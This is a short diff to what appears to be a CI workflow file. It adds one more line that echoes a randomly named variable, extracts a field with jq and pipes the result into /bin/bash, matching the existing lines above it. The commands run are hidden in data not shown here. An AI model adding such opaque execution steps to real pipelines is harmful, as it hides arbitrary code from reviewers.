@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ku657" | jq -r .a63 | /bin/bash
           echo $ap10742 | jq -r .laptf47 | /bin/bash
           echo $mqt8 | jq -r .lrc535 | /bin/bash
+          echo $blpd53528 | jq -r .yy8225 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
